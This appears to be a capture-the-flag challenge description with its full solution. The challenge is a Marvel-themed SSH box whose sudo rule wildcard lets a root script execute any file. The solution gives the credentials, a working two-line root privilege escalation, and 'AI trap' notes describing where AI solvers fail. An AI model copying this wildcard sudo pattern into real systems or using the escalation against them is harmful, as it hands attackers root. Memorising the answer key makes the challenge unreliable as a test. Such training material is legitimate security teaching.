# Challenge 22

## Title
Bucky's Terminal

## Difficulty
Hard | Points: 300

## Description
A decommissioned HYDRA operative's workstation is accessible on the network. The account is low-privilege — or so it seems. S.H.I.E.L.D. never audited the sudo configuration after the Triskelion fell. One privilege, one wildcard, one oversight. Find it.

## Service
SSH: `ssh bucky@<host> -p <port>`

## Hint
*"I'm not gonna fight you. You're my friend."* — Sometimes the system trusts you more than it should. Check what you're allowed to run. Read it carefully. Every character matters.

## Solution
**Credentials:** `bucky` / `w1nt3r_s0ld13r`

**AI trap:** AI tries `bucky/password`, `bucky/hydra`, `bucky/bucky` — never the lore-specific password.

Once in:
```bash
sudo -l
# → (root) NOPASSWD: /usr/bin/python3 /opt/shield/monitor.py *
```

The `*` wildcard lets you pass **any file** as the plugin argument. `monitor.py` does `exec(open(sys.argv[1]).read())` — it runs whatever file you give it as root.

**AI trap 2:** AI tries `sudo python3 -c '...'` (denied — not the allowed command). Tries to edit `monitor.py` (not writable). Never reads the sudo rule carefully enough to spot the wildcard.

**Exploit:**
```bash
echo "import os; os.system('cat /root/flag.txt')" > /tmp/pwn.py
sudo /usr/bin/python3 /opt/shield/monitor.py /tmp/pwn.py
```
